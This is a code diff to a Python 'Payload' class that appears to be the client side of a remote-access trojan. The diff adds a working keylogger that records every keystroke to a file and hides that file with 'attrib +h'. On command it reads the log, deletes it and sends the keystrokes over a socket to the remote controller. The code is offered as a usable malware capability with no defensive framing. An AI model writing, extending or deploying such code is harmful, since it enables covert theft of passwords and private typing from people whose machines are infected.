@@ -5,6 +5,8 @@ import struct
 import socket
 import threading
 import collections
+import os
+from pynput.keyboard import Listener, Key
 
 class Payload():
     def __init__(self, host='0.0.0.0', port=1337, **kwargs):
@@ -114,6 +116,63 @@ class Payload():
             except: 
                 pass
             
+    def keylogger(self, mode=None):
+        file = "./log.txt"
+        
+        def on_press(key):
+            with open(file, 'a') as f:
+                try:
+                    if 'Key' in str(key):
+                        f.write(str(key).replace("'", "").replace('Key.', '') + '\n')
+                    else:
+                        f.write(str(key).replace("'", ""))
+                except:
+                    pass
+            
+        def run():
+            try:
+                with open(file, 'w') as f:
+                    f.write(time.ctime(time.time()) + '\n')
+                os.system(f'attrib +h "{file}"')
+                listener = Listener(on_press=on_press)
+                listener.start()
+                return listener
+            except Exception as e:
+                log(f"Error: {e}", level='error')
+                
+        if "run" in mode:
+            if 'keylogger' not in self.handlers:
+                self.handlers['keylogger'] = run()
+                if self.handlers['keylogger'] != None:
+                    return "Keylogger started"
+                else:
+                    return "Error starting keylogger"
+            else:
+                return "Keylogger already running"
+        elif "stop" in mode:
+            try:
+                if 'keylogger' in self.handlers:
+                    self.handlers['keylogger'].stop()
+                    self.stop('keylogger')
+                    return "Keylogger stopped"
+                else:
+                    return "Keylogger not running"
+            except: 
+                pass
+        elif 'upload' in mode:
+            try:
+                with open(file, 'r') as f:
+                    log = f.read()
+                os.remove(file)
+                data = {'data': str(log), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('uid')}
+                data = json.dumps(data)
+                msg  = struct.pack('!L', len(data)) + data.encode('utf-8')
+                self.connection.sendall(msg)
+                return 'Keystroke log upload complete'
+            except:
+                return "Error reading log file or no log file found"
+            
+            
     def send_task_result(self, task):
         try:
             if not 'session' in task:
@@ -159,12 +218,7 @@ class Payload():
                         command = getattr(self, cmd)
                         result = command(action) if action else command()
                         if result != None:
-                            if type(result) in (list, tuple):
-                                result = '\n'.join(result)
-                            elif type(result) == bytes:
-                                result = str(result.decode())
-                            else:
-                                result = str(result)
+                            result = str(result)
                     except Exception as e:
                         log(f"{self.run.__name__} error: {str(e)}")
                     task.update({'result': result})
